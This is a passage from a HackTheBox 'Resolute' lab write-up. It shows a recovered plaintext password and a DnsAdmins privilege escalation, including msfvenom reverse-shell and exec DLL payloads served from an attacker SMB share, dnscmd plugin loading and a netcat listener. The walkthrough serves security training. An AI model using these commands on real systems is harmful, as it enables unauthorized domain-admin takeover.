</code></pre></div><p>And we get a shell as the user melanie</p>
<p><img src="/img/htb_resolute/4.png" alt=""></p>
<p>We find our user.txt file under the Desktop. So this is our required user.</p>
<p><img src="/img/htb_resolute/5.png" alt=""></p>
<h1 id="privilege-escaltion---user-ryan">Privilege Escaltion - User ryan</h1>
<p>In the C: drive we find an interesting folder PSTranscripts/. Going in, we find
a file &ldquo;PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt&rdquo; inside
another folder. We have a look at the contents of the file.</p>
<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
</code></pre></div><p><img src="/img/htb_resolute/6.png" alt=""></p>
<p>We find the backup of the password for the user <strong>ryan</strong></p>
<p>Creds:</p>
<blockquote>
<p>User: ryan<br>
Password: Serv3r4Admin4cc123!</p>
</blockquote>
<p>We try logging in with evilwinrm</p>
<p>In the <code>\Desktop</code> directory, we fine a note.txt that says</p>
<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>Email to team:
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span>- due to change freeze, any system changes (apart from those to the
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span>  administrator account) will be automatically reverted within 1 minute
</code></pre></div><h1 id="privilege-escalation---administrator">Privilege escalation - Administrator</h1>
<h2 id="dll-injection-in-dns-service">DLL injection in DNS service</h2>
<p>Issuing the command whoami, we find that our user ryan is a memeber of the
group <strong>dnsadmins</strong></p>
<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>whoami /all
</code></pre></div><p><img src="/img/htb_resolute/7.png" alt=""></p>
<p>Members of the group dnsadmins can be used for privilege escalation to admin
with dll injection. This trick is described <a href="https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2">here</a>.</p>
<p>We can generate our payload dll with msfvenom.</p>
<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.55 LPORT=8888 <span style="color:#5bc4bf">-f</span> dll -o dns.dll
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span>smbserver.py SHARE ./
</code></pre></div><p>On target, we can change the config of the dns since the user ryan belongs to
the group <strong>dnsadmins</strong>. We can also start and stop the dns service.</p>
<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>dnscmd RESOLUTE /config /serverlevelplugindll \\10.10.14.55\SHARE\dnsprivesc.dll
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span>sc.exe stop dns
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span>sc.exe start dns
</code></pre></div><p><img src="/img/htb_resolute/8.png" alt=""></p>
<p>We open up a nc listener at port 8888</p>
<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>nc -lnvp <span style="color:#f99b15">8888</span>
</code></pre></div><p>Trying a couple of times, failed to get back a reverse shell. Not sure why it
did not work. A workaround would be elevating the privileges of a user that we
know the password of generating an <strong>exex</strong> payload using msfvenom. We can try
adding the user melanie to the admins group using the dll payload. Then the
user melanie would give us administrative privileges on the machine. We
generate the payload and do the previous steps again on target.</p>
<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>msfvenom -p windows/x64/exec <span style="color:#ef6155">cmd</span><span style="color:#5bc4bf">=</span><span style="color:#48b685">&#39;net group &#34;domain admins&#34; melanie /add /domain&#39;</span> --platform windows -f dll &gt; dns.dll
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span>smbserver.py SHARE ./
</code></pre></div><p>Next we login to user melanie using evilwinrm and look at our user info using</p>
<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>whoami /all
</code></pre></div><p><img src="/img/htb_resolute/9.png" alt=""></p>
<p>We see that we are now a member of the administrator group and can execute
administrator commands. So we can get our required root.txt at
<code>C:\Users\Administrator\Desktop\root.txt</code></p>
<p><img src="/img/htb_resolute/10.png" alt=""></p>

    </div>
    <div class="article-footer">
<blockquote class="mt-2x">
  <ul class="post-copyright list-unstyled">
    <li class="post-copyright-link hidden-xs">
      <strong>Permalink: </strong>
      <a href="/writeups/hackthebox-writeups/hackthebox-resolute-writeup/" title="Hackthebox - Resolute Writeup" target="_blank" rel="external">/writeups/hackthebox-writeups/hackthebox-resolute-writeup/</a>
    </li>
    <li class="post-copyright-license">
      <strong>License：</strong><a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN</a>
    </li>
  </ul>
</blockquote>

<div class="panel panel-default panel-badger">
  <div class="panel-body">
    <figure class="media">
      <div class="media-left">
        <a href="https://github.com/fmash16" target="_blank" class="img-burn thumb-sm visible-lg">
          <img src="/avatar.png" class="img-rounded w-full" alt="">
        </a>
      </div>
      <div class="media-body">
        <h3 class="media-heading"><a href="https://github.com/fmash16" target="_blank"><span class="text-dark">fmash16</span></a></h3>
        <div>Hack the Planet</div>
      </div>
    </figure>
  </div>
</div>

    </div>
  </article>
<section id="comments">
</section>

</div><nav class="bar bar-footer clearfix" data-stick-bottom>
    <div class="bar-inner">
        <ul class="pager pull-left">
            <li class="prev">
                <a href="/writeups/tryhackme-writeups/tryhackme-year-of-the-rabbit-writeup/" title="TryHackMe - Year of the Rabbit - Writeup"><i
                        class="icon icon-angle-left"
                        aria-hidden="true"></i><span>&nbsp;&nbsp;Older</span></a>
            </li>
            <li class="next">
                <a href="/writeups/hackthebox-writeups/hackthebox-montevarde-writeup/"
                    title="Hackthebox - Montevarde Writeup"><span>Newer&nbsp;&nbsp;</span><i
                        class="icon icon-angle-right" aria-hidden="true"></i></a>
            </li>
            
            <li class="toggle-toc">
                <a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false"
                    title="Catalogue" role="button">
                    <span>[&nbsp;</span><span>Index</span>
                    <i class="text-collapsed icon icon-anchor"></i>
                    <i class="text-in icon icon-close"></i>
                    <span>]</span>
                </a>
            </li>
        </ul>
        <div class="bar-right">
            <div class="share-component" data-sites="facebook,twitter"
                data-mobile-sites="">Share on:</div>
        </div>
    </div>
</nav>



</main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
<ul class="social-links">
    <li><a href="https://github.com/fmash16" target="_blank" title="github" data-toggle=tooltip data-placement=top >
            <i class="icon icon-github"></i></a></li>
    <li><a href="/index.xml" target="_blank" title="rss" data-toggle=tooltip data-placement=top >
            <i class="icon icon-rss"></i></a></li>
    <li><a href="https://twitter.com/fmash16" target="_blank" title="twitter" data-toggle=tooltip data-placement=top >
            <i class="icon icon-twitter"></i></a></li>
</ul>
  <div class="copyright">
    &copy;2020  -
    2020
    
    
    </div>
  </div>
</footer>

<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_SVG"></script>
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
            showMathMenu: false, //disables context menu
            tex2jax: {
            inlineMath: [ ['$','$'], ['\\(','\\)'] ]
           }
    });
</script>


<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
<script>
    window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
</script>
<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/highlight.min.js"></script><script>
    hljs.configure({
        tabReplace: '    ', 
        classPrefix: ''     
        
    })
    hljs.initHighlightingOnLoad();
</script>
<script src="/js/application.min.bdeb64b910570b6c41badc6a05b7afb0c8ad9efd8525de3c7257d59e786326a3.js"></script>
<script src="/js/plugin.min.51ff8c7317566f82259170fa36e09c4493adc9b9378b427a01ad3f017ebac7dd.js"></script>

<script>
    (function (window) {
        var INSIGHT_CONFIG = {
            TRANSLATION: {
                POSTS: 'Posts',
                PAGES: 'Pages',
                CATEGORIES: 'Categories',
                TAGS: 'Tags',
                UNTITLED: '(Untitled)',
            },
            ROOT_URL: '\/',
            CONTENT_URL: '\/\/searchindex.json ',
        };
        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
    })(window);
</script>
<script type="text/javascript" src="/js/insight.min.7f3407251ef14950645ac695d0cf7cd29c5cabfb6916e63dcb54b83d8f1fc2126d10bd5446875e78d27a76ecd651a3532b49a7e4da02ee4de51660edba2d23f1.js" defer></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
<script>
    tocbot.init({
        
        tocSelector: '.js-toc',
        
        contentSelector: '.js-toc-content',
        
        headingSelector: 'h1, h2, h3',
        
        hasInnerContainers: true,
    });
</script>


  </body>
</html>
